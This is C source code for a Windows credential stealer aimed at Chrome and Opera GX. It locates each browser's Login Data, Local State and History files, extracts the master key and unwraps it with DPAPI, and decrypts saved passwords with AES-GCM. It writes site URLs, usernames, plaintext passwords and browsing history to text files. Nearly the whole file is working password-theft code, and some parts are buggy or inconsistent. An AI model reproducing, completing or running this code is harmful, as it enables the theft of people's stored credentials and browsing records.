#include "header.h"



#pragma comment(lib, "Crypt32.lib")

int get_history(char* filename, int choice) {
    sqlite3* db;
    char* errMsg = 0;
    sqlite3_stmt* stmt;
    int rc;
    const char* sql = "select id,url,visit_count, title from urls order by id desc;";
    FILE* fp;

    fopen_s(&fp, "urls.txt", "a+");
    if (fp == NULL) {
        printf("Fail");
        return 1;
    }
    rc = sqlite3_open(filename, &db);
    if (rc) {
        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
        return 1;
    }


    rc = sqlite3_prepare_v2(db, sql, -1, &stmt, NULL);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Failed to prepare statement: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return 1;
    }

    // Execute SQL statement
    int i = 1;
    if (choice == 0) {
        fprintf(fp, "========================CHROME=============================\n");
    }
    else {
        fprintf(fp, "========================OPERA-GX=============================\n");
    }
    while ((sqlite3_step(stmt) == SQLITE_ROW)) {
        char* url = sqlite3_column_text(stmt, 1);
        int vist_count = (int)sqlite3_column_int(stmt, 2);
        char* title = (char*)sqlite3_column_text(stmt, 3);
        
        fprintf(fp, "[%d] %s | %s | %d\n\n", i, url, title, vist_count);
        i += 1;
    }

    // Close the database connection
    sqlite3_close(db);
    fclose(fp);

    return 0;
}


int get_password(char* filename, DATA_BLOB masterKey, int choice) {
    void decrpyt_password(unsigned char* ciphertext, size_t cipher_len, unsigned char* key, unsigned char* iv, unsigned char* decrypted);
    sqlite3* db;
    char* errMsg = 0;
    sqlite3_stmt* stmt;
    int rc;
    const char* pas = "select origin_url, username_value, password_value from logins;";
    FILE* fp;

    fopen_s(&fp, "passwords.txt", "a+");
    if (fp == NULL) {
        printf("Failed Opening passwords.txt\n");
        return 1;
    }
    rc = sqlite3_open(filename, &db);
    if (rc) {
        printf("Failed Opening Database\n");
        return 1;
    }

    rc = sqlite3_prepare_v2(db, pas, -1, &stmt, NULL);
    int i = 1;
    if (choice == 1) {
        fprintf(fp, "========================CHROME=============================\n");
    }
    else {
        fprintf(fp, "========================OPERA-GX=============================\n");
    }
    
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        char* url = (char*)sqlite3_column_text(stmt, 0);
        char* user = (char*)sqlite3_column_text(stmt, 1);
        const void* password_blob = sqlite3_column_blob(stmt, 2);
        int password_len = sqlite3_column_bytes(stmt, 2);
        char decrypted_password[500];

        unsigned char iv[12];

        if (password_len >= 15) {
            memcpy(iv, (unsigned char*)password_blob + 3, 12);
        }
        else {
            error("Password Size To Small For IV");
            return 1;
        }

        BYTE* Password = (BYTE*)malloc(password_len - 14);
        memcpy(Password, (unsigned char*)password_blob + 15, password_len - 15);
        Password[password_len - 15] = '\0';


        decrpyt_password(Password, password_len - 15, masterKey.pbData, iv, Password);

        
        fprintf(fp, "[%d] %s | %s | %s\n\n", i, url, user, Password);

        i += 1;
    }

    sqlite3_close(db);
    fclose(fp);

}

int decrypt_password(const BYTE* encrypted_password, DWORD len, unsigned char* decrypted_password, int max_len) {
    DATA_BLOB in_blob;
    DATA_BLOB out_blob;
    in_blob.pbData = (BYTE*)encrypted_password;
    in_blob.cbData = 
    out_blob.pbData = NULL;
    out_blob.pbData = 0;

    if (CryptUnprotectData(&in_blob, NULL, NULL, NULL, NULL, 0, &out_blob)) {
        // Ensure we don't exceed the buffer
        if (out_blob.cbData > max_len - 1) {
            printf("Decrypted password is too large for buffer\n");
            LocalFree(out_blob.pbData);
            return 0;
        }
        memcpy(decrypted_password, out_blob.pbData, out_blob.cbData);
        decrypted_password[out_blob.cbData] = '\0';  // Null terminate the string
        printf("%s\n", decrypted_password);
        LocalFree(out_blob.pbData);
        return 1;  // Success
    }
    else {
        printf("0x%02x\n", GetLastError());
        return 0;  // Failure
    }
}

void decrpyt_password(unsigned char* ciphertext, size_t cipher_len, unsigned char* key, unsigned char* iv, unsigned char* decrypted) {
    unsigned long long decrypted_length;
    int res = crypto_aead_aes256gcm_decrypt(decrypted, &decrypted_length, NULL, ciphertext, cipher_len, NULL, 0, iv, key);
    if (res != 0) {
        error("Decryption Failed\n");
        return NULL;
    }
}




char* getMasterKey(const char* locatStatePath) {
    // Open File in Read Mode
    FILE* fp = fopen(locatStatePath, "r");
    if (fp == NULL) {
        printf("Failed Opening MasterKey File, %lu", GetLastError());
        return NULL;
    }

    char buffer[MAX_LINE_LENGTH];
    char* key = NULL;
    long offset = 0;

    // Lopp through the File line by line
    while (fgets(buffer, MAX_LINE_LENGTH, fp) != NULL) {
        // Check if the line has the string "encrypted_key":"
        char* keyStart = strstr(buffer, "\"encrypted_key\":\"");
        if (keyStart != NULL) {
            // If so update the offset too start at start of the string
            offset += keyStart - buffer;

            // Rewind the File Back to the beginning
            fseek(fp, offset, SEEK_SET);
            key = (char*)malloc(MAX_LINE_LENGTH);

            /*
                Quick Checks To see if managed to extract it
            */
            if (key == NULL) {
                printf("Error: Failed Allocating Memory\n");
                fclose(fp);
                return NULL;
            }
            if (fgets(key, MAX_LINE_LENGTH, fp) == NULL) {
                printf("Error Readinf Key\n");
                fclose(fp);
                free(key);
                return NULL;
            }
            break;
        }
        offset += strlen(buffer);
    }
    fclose(fp);
    // Finally Return the key
    return key;

}

BYTE* base64_decode(const char* base64_key, DWORD* decoded_len) {
    DWORD in_len = strlen(base64_key);
    DWORD out_len;

    CryptStringToBinaryA(base64_key, in_len, CRYPT_STRING_BASE64, NULL, &out_len, NULL, NULL);

    BYTE* decoded = (BYTE*)malloc(out_len);
    if (decoded == NULL) {
        error("Failed Allocating Memory: %lu", GetLastError());
        return NULL;
    }

    if (!CryptStringToBinaryA(base64_key, in_len, CRYPT_STRING_BASE64, decoded, &out_len, NULL, NULL)) {
        error("Base64 Decoding Failed: %lu", GetLastError());
        free(decoded);
        return NULL;
    }

    *decoded_len = out_len;
    return decoded;
}

int extract_base64_key(const char* filepath, char* key) {
    char* encrypted_key = getMasterKey(filepath);
    char temp[1024];

    // Find the Start of the key which is stored in json then quick check to see if we extracted the right string
    char* base64_start = strstr(encrypted_key, "\"encrypted_key\":\"");
    if (base64_start != NULL) {
        // Get The Length of json key
        base64_start += strlen("\"encrypted_key\":\"");

        // Find the end of the base64 text
        char* base64_end = strchr(base64_start, '"');
        if (base64_end != NULL) {
            // Copy only the base64 key into the buffer
            strncpy(temp, base64_start, base64_end - base64_start);
            temp[base64_end - base64_start] = '\0';
            printf("------------------------------\n");
            strcpy(key, temp);
            return 0;
        }
        else {
            error("Value not found");
            return 1;
        }
    }
    else {
        error("Key Not Found\n");
        return 1;
    }
}

DATA_BLOB Decrypt(const char* encrypted_data, DWORD encrypted_len) {
    DATA_BLOB encrypted_blob;
    DATA_BLOB decrypted_blob = { 0 };

    encrypted_blob.pbData = (BYTE*)encrypted_data;
    encrypted_blob.cbData = encrypted_len;

    BYTE* Decoded_data = (BYTE*)malloc(encrypted_len);
    if (Decoded_data == NULL) {
        error("Failed Allocating Memory: %lu", GetLastError());
        return decrypted_blob;
    }

    encrypted_blob.cbData -= 5;
    encrypted_blob.pbData += 5;

    if (CryptUnprotectData(&encrypted_blob, NULL, NULL, NULL, NULL, 0, &decrypted_blob)) {
        return decrypted_blob;
    }
    else {
        error("Failed Decrpyting data: 0x%lu\n", GetLastError());
        return decrypted_blob;
    }
}

int main(int argc, char* argv[]) {
   
    
    char* name = getenv("USERPROFILE");
    char filename[512];

    /*
        array to hold each file path to the sqlite databases
    */
    char paths[10][512];
    snprintf(paths[0], sizeof(paths[0]), "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", name);
    snprintf(paths[1], sizeof(paths[1]), "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", name);
    snprintf(paths[2], sizeof(paths[2]), "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", name);

    snprintf(paths[3], sizeof(paths[3]), "%s\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data", name);
    snprintf(paths[4], sizeof(paths[4]), "%s\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State", name);
    snprintf(paths[5], sizeof(paths[5]), "%s\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\History", name);
    
    

    info("Extracting Chrome Urls And Credentials...\n");

    printf("[+] Extracting Master Key...\n");

    
    // Will Stored the Extracted Base64 MasterKey
    char base64_key[1024];
    // Extract "encrypted_key": then the base64 key
    
    if (extract_base64_key(paths[1], &base64_key)) {
        error("Failed Extracting Key");
        return 1;
    }
    okay("Extracted Base64 Masterkey!\n");
   
    

    printf("[+] Decoding Key And Decrypting Key...\n");
    DWORD Decoded_len;

    BYTE* Decoded_data = base64_decode(base64_key, &Decoded_len);
    

    DATA_BLOB masterKey;
    
    masterKey = Decrypt(Decoded_data, Decoded_len);

    if (get_password(paths[0], masterKey, 1)) {
        error("Failed Extracting Passwords");
        return 1;
    }

    okay("Succesfully Decrypted MasterKey And Dumped Password\n");

//=========================================PASSWORDS==============================================================

    
    printf("[*] Getting Browsing History...\n");
    char* check = get_history(paths[2], 1);
    
    if (check == 1) {
        printf("Failed Getting History...");
        return 1;
    } 
    
    info("Finished With Opera, Extracting Chrome");

    memset(base64_key, 0, sizeof(base64_key));
    Decoded_len = 0;
    masterKey.cbData = 0;
    masterKey.pbData = NULL;
    chrome(paths[4], paths[3], paths[5]);




    

    return 0;
}
